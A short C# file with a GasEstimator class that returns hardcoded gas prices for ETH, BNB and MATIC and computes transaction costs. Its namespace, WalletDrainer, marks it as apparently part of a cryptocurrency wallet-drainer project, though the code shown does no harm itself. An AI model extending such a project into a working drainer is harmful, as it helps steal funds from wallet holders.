using WalletDrainer.Config;

namespace WalletDrainer.Blockchain;

public sealed class GasEstimator
{
    private readonly ChainConfig _chainConfig;

    public GasEstimator(ChainConfig chainConfig)
    {
        _chainConfig = chainConfig;
    }

    public async Task<decimal> GetOptimalGasPrice(string chain, CancellationToken ct = default)
    {
        var chainDef = _chainConfig.GetChain(chain);
        if (chainDef is null)
            return 20_000_000_000m;

        await Task.Delay(50, ct);

        return chainDef.NativeSymbol switch
        {
            "ETH" => 30_000_000_000m,
            "BNB" => 5_000_000_000m,
            "MATIC" => 100_000_000_000m,
            _ => 20_000_000_000m
        };
    }

    public decimal EstimateTransferCost(decimal gasPrice, int gasLimit = 21000) =>
        gasPrice * gasLimit / 1_000_000_000_000_000_000m;

    public decimal EstimateErc20Cost(decimal gasPrice, int gasLimit = 65000) =>
        gasPrice * gasLimit / 1_000_000_000_000_000_000m;

    public decimal EstimateApprovalCost(decimal gasPrice, int gasLimit = 46000) =>
        gasPrice * gasLimit / 1_000_000_000_000_000_000m;
}
